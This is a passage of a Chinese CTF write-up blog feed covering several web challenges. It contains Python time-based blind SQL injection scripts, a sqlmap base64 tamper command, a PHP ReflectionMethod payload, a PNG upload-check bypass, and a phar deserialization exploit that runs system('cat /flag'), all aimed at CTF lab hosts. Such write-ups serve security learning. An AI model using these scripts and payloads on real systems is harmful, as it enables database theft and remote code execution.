    <content type="html"><![CDATA[<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MT的第一题，时间盲注，但是常见的字符都过了<code>ascii</code>、<code>substr</code>,大于号小于号等于号，<code>lile</code>,<code>if</code>都过了，不会了   </p><p><code>W&amp;M</code> 的WP   </p><pre><code><pre><code class="hljs python">    <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ord2hex</span>(<span class="hljs-params">string</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))    result = result.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+result    url = <span class="hljs-string">&quot;http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php&quot;</span>    string = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>]    headers = &#123;        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,        <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,        <span class="hljs-string">&#x27;Connection&#x27;</span>:<span class="hljs-string">&#x27;keep-alive&#x27;</span>        &#125;    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:        passwd = ord2hex(<span class="hljs-string">&#x27;^&#x27;</span>+res+<span class="hljs-built_in">chr</span>(j))        <span class="hljs-comment">#print(passwd)</span>        passwd = <span class="hljs-string">&#x27;||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#&#x27;</span>.<span class="hljs-built_in">format</span>(passwd)        <span class="hljs-comment">#print(passwd)</span>        data = &#123;        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,        <span class="hljs-string">&#x27;password&#x27;</span>:passwd        &#125;        before_time = time.time()        r = req.post(url, data=data, headers=headers)        after_time = time.time()        <span class="hljs-comment">#print( r.text)</span>        offset = after_time - before_time        <span class="hljs-comment"># print(offset)</span>        <span class="hljs-keyword">if</span> (offset &gt; <span class="hljs-number">2</span>):        print(passwd)        res += <span class="hljs-built_in">chr</span>(j)        print(res)        <span class="hljs-keyword">break</span>    <span class="hljs-comment">#password This_1s_thE_Passw0rd</span>    ```    `case when`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">27e74714170</span>e20bb.png)    `regexp`正则匹配     这个匹配可以直接匹配到字符的十六进制，Mysql会将十六进制转换      ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">69215</span>b03e678fd6b.png)        <span class="hljs-comment">## easytricks </span>MT      也有SQL注入的点   ` select * <span class="hljs-keyword">from</span> user where user=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> passwd=<span class="hljs-string">&#x27;%s&#x27;</span>`    %s----&gt;字符串      [sprintf格式化注入漏洞](https://blog.csdn.net/weixin_41185953/article/details/<span class="hljs-number">80485075</span>)     `没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%<span class="hljs-number">1</span>$\）被替换为空`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">7</span>b7afea854b5deba.png)     可以看到`%<span class="hljs-number">1</span>$`后的`<span class="hljs-string">&#x27;`被吞了      </span><span class="hljs-string"></span><span class="hljs-string">[MTCTF-2021 Write_Up by 打CTF不靠实力靠运气](https://mp.weixin.qq.com/s/zP7pOdL0zbWzKMJlVcff-Q)     </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">##  easy_source   </span><span class="hljs-string">CISCN   </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">`.index.php.swo`    </span><span class="hljs-string"></span><span class="hljs-string">    ```php</span><span class="hljs-string">    &lt;?php</span><span class="hljs-string">    class User</span><span class="hljs-string">    &#123;</span><span class="hljs-string">        private static $c = 0;</span><span class="hljs-string"></span><span class="hljs-string">        function a()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function b()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function c()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function d()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function e()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function f()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function g()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function h()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function i()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function j()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function k()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function l()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function m()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function n()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function o()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function p()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function q()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function r()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function s()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function t()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string">        </span><span class="hljs-string">    &#125;</span><span class="hljs-string"></span><span class="hljs-string">    $rc=$_GET[&quot;rc&quot;];</span><span class="hljs-string">    $rb=$_GET[&quot;rb&quot;];</span><span class="hljs-string">    $ra=$_GET[&quot;ra&quot;];</span><span class="hljs-string">    $rd=$_GET[&quot;rd&quot;];</span><span class="hljs-string">    $method= new $rc($ra, $rb);</span><span class="hljs-string">    var_dump($method-&gt;$rd());</span></code></pre></code></pre><p>利用PHP原生类读取类中的注释<br><code>ReflectionMethod</code>  </p><p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>–&gt;$class类的名称      </p><p>–&gt;$name方法的名称         </p><p>或者<code>public ReflectionMethod::__construct ( string $class_method )</code>      </p><p>$class_method–&gt;类的名称和方法的名称中间以<code>::</code>分割      </p><p>ReflectionMethod中的<code>getDocComment</code>可以返回注释 代码     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e78bf4d72e174c59.png">     </p><p>payload:<code>rc=ReflectionMethond&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code>      </p><p>ReflectionMethod里的其他方法    </p><pre><code>```php$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。​```</code></pre><p><a href="http://www.xl-bit.cn/index.php/archives/434/">Bit’s Blog —-CISCN2021—初赛—WP（及部分解题思路）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sql&quot;&gt;&lt;a href=&quot;#sql&quot; class=&quot;headerlink&quot; title=&quot;sql&quot;&gt;&lt;/a&gt;sql&lt;/h2&gt;&lt;p&gt;MT的第一题，时间盲注，但是常见的字符都过了&lt;code&gt;ascii&lt;/code&gt;、&lt;code&gt;substr&lt;/code&gt;,大于号小于</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/categories/CTF/sql/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Avatar Uploader 1</title>
    <link href="http://lll-nnn.github.io/2021/05/24/BUU88/"/>
    <id>http://lll-nnn.github.io/2021/05/24/BUU88/</id>
    <published>2021-05-24T14:43:09.000Z</published>
    <updated>2021-05-24T15:03:50.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>打开环境  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ec5696d2927c25ee.png"><br>先随便输个进去看看<br><img src="https://ftp.bmp.ovh/imgs/2021/05/5c988c69bedf52e1.png">     </p><p>文件上传   </p><p>尝试了几下，感觉没戏，只让上传PNG    </p><p>看下WP<br>给了源码    </p><p><code>upload.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);$session = <span class="hljs-keyword">new</span> SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);<span class="hljs-comment">// check whether file is uploaded</span><span class="hljs-keyword">if</span> (!file_exists($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);&#125;<span class="hljs-comment">// check file size</span><span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);&#125;<span class="hljs-comment">// check file type</span>$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);finfo_close($finfo);<span class="hljs-keyword">if</span> (!in_array($type, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);&#125;<span class="hljs-comment">// check file width/height</span>$size = getimagesize($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || $size[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<span class="hljs-comment">// I hope this never happens...</span><span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);&#125;<span class="hljs-comment">// ok</span>$filename = bin2hex(random_bytes(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . $filename);$session-&gt;set(<span class="hljs-string">&#x27;avatar&#x27;</span>, $filename);flash(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);redirect(<span class="hljs-string">&#x27;/&#x27;</span>);</code></pre></code></pre><p><code>getimagesize</code>函数返回的是一个数组     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/856b33eae66eb5e9.png">      </p><p><code>[0]</code>和<code>[1]</code>分别是宽度和高度<br><code>[2]</code>是图片的类型    </p><pre><code>GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP       按此顺序的编号1=&gt;GIF、3=&gt;PNG     </code></pre><p>按源码的要求，需要<code>finfo_file()</code>为<code>imag/png</code>；而<code>getimagesize</code>得到的<code>$size[2]!==IMAGETYPE_PNG</code>       </p><p><code>finfo_file()</code>识别PNG文件十六进制下的第一行，删掉剩余的数据即可绕过<code>getimagesize()</code>    </p><p>所以用<code>winhex</code>对文件处理<br><img src="https://ftp.bmp.ovh/imgs/2021/05/cef90b357e70f2a4.png">      </p><p>上传后即可得到flag   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cc52aa2d9fdf817e.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP&quot;&gt;&lt;a href=&quot;#PHP&quot; class=&quot;headerlink&quot; title=&quot;PHP&quot;&gt;&lt;/a&gt;PHP&lt;/h2&gt;&lt;p&gt;打开环境  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/2021/05/ec5696d29</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>海洋大学CTF</title>
    <link href="http://lll-nnn.github.io/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/"/>
    <id>http://lll-nnn.github.io/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/</id>
    <published>2021-05-23T15:14:22.000Z</published>
    <updated>2021-05-23T16:00:16.125Z</updated>
    
    <content type="html"><![CDATA[<h2 id="合成大晦气"><a href="#合成大晦气" class="headerlink" title="合成大晦气"></a>合成大晦气</h2><p>js里找到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png">      </p><h2 id="白给密码"><a href="#白给密码" class="headerlink" title="白给密码"></a>白给密码</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cf263d59e13cbc37.png">    </p><p>sql注入，不过这道题对username和password进行base64编码；抓包后万能密码得到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png">        </p><h2 id="Deep♂Dark♂Database"><a href="#Deep♂Dark♂Database" class="headerlink" title="Deep♂Dark♂Database"></a>Deep♂Dark♂Database</h2><p>上一道题的环境，不过还有flag，应该在数据库里；最简单的时间盲注，什么也没过滤   </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> datetimeurl=<span class="hljs-string">&#x27;http://39.106.29.44:10424/&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):    s=<span class="hljs-number">30</span>    l=<span class="hljs-number">127</span>    mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(s&lt;l):        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        payload=<span class="hljs-string">&quot;1&#x27; or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        pay=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))        payl=<span class="hljs-built_in">str</span>(pay)        print(payload)        data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:payl[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]&#125;        time1=datetime.datetime.now()        re=requests.post(url=url,data=data)        time2=datetime.datetime.now()        tem=(time2-time1).seconds        <span class="hljs-keyword">if</span>(tem&gt;<span class="hljs-number">3</span>):            s=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            l=mid        mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre></code></pre><p>或者直接sqlmap也可，sqlmap里有对payload进行base64编码的tamper；我还傻傻的写了个     </p><p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p><p>得到的flag  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png">     </p><p>hex解码–&gt;base64解码—&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p><h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>代码审计     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);    $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];    $filePath = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.md5($iipp);    $filePath_2 = $filePath.<span class="hljs-string">&#x27;/test.txt&#x27;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))    &#123;        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;write&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;            <span class="hljs-keyword">if</span>(!file_exists($filePath))&#123;                 mkdir($filePath);                &#125;            $res = file_put_contents($filePath_2, base64_decode(($_POST[<span class="hljs-string">&#x27;content&#x27;</span>])));            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Successful!&quot;</span>.<span class="hljs-string">&quot; your path is &quot;</span>.$filePath_2);        &#125;        <span class="hljs-keyword">elseif</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;check&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>])) &#123;            <span class="hljs-keyword">if</span>(file_exists($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>]))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);        &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>感觉没啥可利用的，写入也是写进<code>txt</code>文件<br>有个<code>secret.php</code>但直接访问什么也没有，不会了  </p><p>在同学的提示下扫了下目录，这种代码审计题要扫目录是我没想到的，发现有git泄露     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png">     </p><p>git下来<code>secret.php</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d7f283100df9a35b.png">      </p><p>一个类，eval命令执行    </p><p>但没有序列化，反序列化的点    </p><p><code>phar://</code>反序列化     </p><p>源码中<code>elseif</code>中的<code>file_exists</code>支持phar协议；所以传入<code>filepath=phar://+文件路径</code>即可     </p><p>生成phar文件      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;        <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> TestObject();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp2.phar&quot;</span>); <span class="hljs-comment">//.phar文件</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的</span>$phar-&gt;setMetadata($a); <span class="hljs-comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>因为phar文件中有一些不可见字符，不能直接复制粘贴进行base64编码    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;$fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//以二进制打开文件</span>$content=fread($fp,filesize($path));  <span class="hljs-comment">//读取文件</span>$content=base64_encode($content);<span class="hljs-keyword">echo</span> $content;</code></pre></code></pre><p>上传    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png">      </p><p>访问     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/02fdc9258601b902.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;合成大晦气&quot;&gt;&lt;a href=&quot;#合成大晦气&quot; class=&quot;headerlink&quot; title=&quot;合成大晦气&quot;&gt;&lt;/a&gt;合成大晦气&lt;/h2&gt;&lt;p&gt;js里找到flag    &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/20</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
